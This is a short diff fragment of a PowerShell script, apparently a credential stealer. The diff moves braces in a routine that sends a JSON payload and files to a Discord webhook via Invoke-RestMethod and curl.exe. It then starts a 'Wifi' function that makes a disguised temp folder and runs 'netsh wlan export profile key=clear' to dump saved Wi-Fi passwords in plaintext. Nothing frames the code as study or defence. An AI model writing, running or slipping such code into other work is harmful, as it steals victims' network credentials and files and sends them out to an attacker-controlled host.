@@ -55,13 +55,13 @@ $payload = [PSCustomObject]@{
     embeds = $embedArray
 
 }
-
+}
 if (-not ([string]::IsNullOrEmpty($text))){
 #Send over payload, converting it to JSON
-Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'}
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
-}
+
 function Wifi {
 New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
 Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
